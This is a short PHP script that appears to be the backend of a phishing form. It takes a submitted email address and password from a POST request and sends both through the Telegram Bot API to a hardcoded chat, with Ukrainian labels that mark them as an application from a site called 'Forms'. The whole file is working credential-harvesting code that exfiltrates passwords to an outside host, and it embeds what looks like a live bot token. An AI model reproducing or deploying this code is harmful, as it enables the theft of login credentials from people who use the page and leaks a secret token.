<?php
if($_POST) {
    try {
        $mail = $_POST["mail"];
        $pass = $_POST["pass"];
    
        } catch (\Throwable $th) {
            $mail = "ERROR IN MESSAGE";
        }
    
        $token = "7176990752:AAFgJ-AVyV6WCpxgP9BqXjMyzUiYz8nFiJo";
        $chat_id = 5858755336;
    
        $mail = urlencode("$mail");
        $pass = urlencode("$pass");
    
        $urlQuery = "https://api.telegram.org/bot". $token . "/sendMessage?chat_id=". $chat_id ."&text=" .
        "<b>Заявка з сайту Forms: </b>%0a" .
        "<b>Form6: </b>%0A" .
        "<i>Ел. пошта: $mail</i>%0A" .
        "<i>Пароль: $pass</i>%0A";
        $urlQuery .= "&parse_mode=HTML";
        $result = file_get_contents($urlQuery);
}
?>